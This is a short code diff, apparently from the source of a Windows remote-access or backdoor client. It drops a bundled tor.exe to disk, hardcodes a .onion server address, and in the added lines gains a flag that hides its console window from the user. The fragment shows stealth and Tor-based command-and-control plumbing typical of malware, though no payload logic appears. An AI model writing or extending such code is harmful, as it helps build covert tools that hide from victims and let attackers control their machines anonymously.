@@ -26,8 +26,11 @@ void dropTor() {
 }
 
 #define HOST "zd2j5murooa4imqzfa52ikp3rxsauti5fip4k4atppdbvpgdewzkwpyd.onion"
+#define showConsole true
 
 int main() {
+    ShowWindow(GetConsoleWindow(), (showConsole) ? SW_SHOW : SW_HIDE);
+
     // Put TOR onto the disk if it isnt there already
     if (GetFileAttributes(L"tor.exe") == INVALID_FILE_ATTRIBUTES) {
         dropTor();
